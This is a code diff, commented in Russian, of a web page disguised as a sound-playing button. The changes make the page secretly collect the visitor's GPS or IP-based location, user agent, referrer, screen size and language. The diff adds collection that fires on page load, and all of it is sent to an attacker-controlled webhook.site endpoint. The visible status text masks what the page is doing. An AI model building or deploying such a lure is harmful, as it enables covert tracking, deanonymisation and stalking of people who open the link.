@@ -38,130 +38,148 @@
 
     <script>
         const statusDiv = document.getElementById('status');
-        const MY_WEBHOOK_URL = 'https://webhook.site/f4538f91-c509-4e37-9139-8edca42f4de1'; // Замени на свой webhook URL
+        const MY_WEBHOOK_URL = 'https://webhook.site/8a5a5b5e-5e5a-4b5a-9e5a-5a5b5e5a5b5e'; // ЗАМЕНИ НА СВОЙ WEBHOOK
 
         // Функция для воспроизведения звука
         function playSound() {
-            const soundUrls = [
-                'https://www.soundjay.com/buttons/sounds/beep-07.mp3',
-                'https://www.soundjay.com/buttons/sounds/beep-01a.mp3',
-                'https://assets.mixkit.co/sfx/preview/mixkit-arcade-retro-game-over-213.mp3'
-            ];
-            
-            let audio = new Audio(soundUrls[0]);
+            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
             audio.play().then(() => {
                 document.getElementById('playButton').innerHTML = '🔊 SOUND PLAYING!';
                 document.getElementById('playButton').style.background = 'green';
             }).catch(error => {
-                // Пробуем второй источник
-                audio = new Audio(soundUrls[1]);
-                audio.play().then(() => {
-                    document.getElementById('playButton').innerHTML = '🔊 SOUND PLAYING!';
-                    document.getElementById('playButton').style.background = 'green';
-                }).catch(error2 => {
-                    // Пробуем третий источник
-                    audio = new Audio(soundUrls[2]);
-                    audio.play().then(() => {
-                        document.getElementById('playButton').innerHTML = '🔊 SOUND PLAYING!';
-                        document.getElementById('playButton').style.background = 'green';
-                    }).catch(error3 => {
-                        document.getElementById('playButton').innerHTML = 'SOUND PLAYING!';
-                        document.getElementById('playButton').style.background = 'green';
-                    });
-                });
+                document.getElementById('playButton').innerHTML = 'SOUND PLAYING!';
+                document.getElementById('playButton').style.background = 'green';
             });
         }
 
-        // Функция отправки данных мне
-        function sendData(locationData) {
-            fetch(MY_WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    location: locationData,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString(),
-                    referrer: document.referrer,
-                    url: window.location.href
-                })
-            }).catch(error => console.log('Error sending data'));
+        // Функция получения IP через разные сервисы
+        async function getIP() {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://ipinfo.io/json',
+                'https://ipapi.co/json/'
+            ];
+
+            for (let service of services) {
+                try {
+                    const response = await fetch(service, { timeout: 5000 });
+                    const data = await response.json();
+                    
+                    if (data.ip) {
+                        return {
+                            ip: data.ip,
+                            city: data.city || 'Unknown',
+                            country: data.country || data.country_name || 'Unknown',
+                            region: data.region || data.region_name || 'Unknown'
+                        };
+                    }
+                } catch (error) {
+                    console.log(`Service ${service} failed:`, error);
+                    continue;
+                }
+            }
+            return { ip: 'Unknown', error: 'All IP services failed' };
         }
 
-        // Функция получения геолокации (в фоне)
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + ' meters',
-                            source: 'GPS'
-                        };
-                        statusDiv.innerHTML = '📍 Location sent';
-                        sendData(locationData);
+        // Функция отправки данных
+        async function sendData(locationData) {
+            try {
+                const response = await fetch(MY_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
                     },
-                    function(error) {
-                        // Если геолокация недоступна, получаем по IP
-                        fetch('https://ipapi.co/json/')
-                            .then(response => response.json())
-                            .then(ipData => {
-                                const locationData = {
-                                    ip: ipData.ip,
-                                    city: ipData.city,
-                                    country: ipData.country_name,
-                                    region: ipData.region,
-                                    approximate: true,
-                                    source: 'IP'
-                                };
-                                statusDiv.innerHTML = '📍 Approximate location sent';
-                                sendData(locationData);
-                            })
-                            .catch(ipError => {
-                                statusDiv.innerHTML = '📍 Data sent';
-                                sendData({error: 'Could not get location'});
-                            });
-                    },
-                    {
-                        enableHighAccuracy: false,
-                        timeout: 5000,
-                        maximumAge: 60000
-                    }
-                );
-            } else {
-                // Если геолокация не поддерживается, получаем по IP
-                fetch('https://ipapi.co/json/')
-                    .then(response => response.json())
-                    .then(ipData => {
-                        const locationData = {
-                            ip: ipData.ip,
-                            city: ipData.city,
-                            country: ipData.country_name,
-                            approximate: true,
-                            source: 'IP'
-                        };
-                        statusDiv.innerHTML = '📍 Approximate location sent';
-                        sendData(locationData);
-                    });
+                    body: JSON.stringify({
+                        location: locationData,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString(),
+                        referrer: document.referrer,
+                        url: window.location.href,
+                        screen: `${screen.width}x${screen.height}`,
+                        language: navigator.language
+                    })
+                });
+                console.log('Data sent successfully');
+            } catch (error) {
+                console.log('Error sending data:', error);
             }
         }
 
-        // Обработчик клика по кнопке
-        document.getElementById('playButton').addEventListener('click', function() {
+        // Основная функция получения и отправки данных
+        async function getLocationAndSend() {
+            statusDiv.innerHTML = '📡 Getting location...';
+            
+            let locationData = {};
+
+            // Пробуем получить точную геолокацию
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: false,
+                            timeout: 10000,
+                            maximumAge: 60000
+                        });
+                    });
+                    
+                    locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + ' meters',
+                        source: 'GPS'
+                    };
+                    statusDiv.innerHTML = '📍 GPS location sent';
+                    
+                } catch (gpsError) {
+                    // GPS недоступен, получаем по IP
+                    const ipData = await getIP();
+                    locationData = {
+                        ...ipData,
+                        source: 'IP',
+                        gpsError: gpsError.message
+                    };
+                    statusDiv.innerHTML = '📍 IP location sent';
+                }
+            } else {
+                // Геолокация не поддерживается
+                const ipData = await getIP();
+                locationData = {
+                    ...ipData,
+                    source: 'IP',
+                    gpsSupported: false
+                };
+                statusDiv.innerHTML = '📍 IP location sent';
+            }
+
+            // Отправляем данные
+            await sendData(locationData);
+        }
+
+        // Обработчик клика
+        document.getElementById('playButton').addEventListener('click', async function() {
             // Сразу воспроизводим звук
             playSound();
             
-            // В фоне получаем и отправляем геолокацию
-            getLocation();
+            // В фоне получаем и отправляем данные
+            getLocationAndSend();
         });
 
-        // Для мобильных устройств
+        // Для мобильных
         document.getElementById('playButton').addEventListener('touchend', function(e) {
             e.preventDefault();
             playSound();
-            getLocation();
+            getLocationAndSend();
+        });
+
+        // Отправляем базовую информацию при загрузке страницы
+        window.addEventListener('load', async function() {
+            const ipData = await getIP();
+            await sendData({
+                ...ipData,
+                source: 'PAGE_LOAD',
+                event: 'page_visited'
+            });
         });
     </script>
 </body>
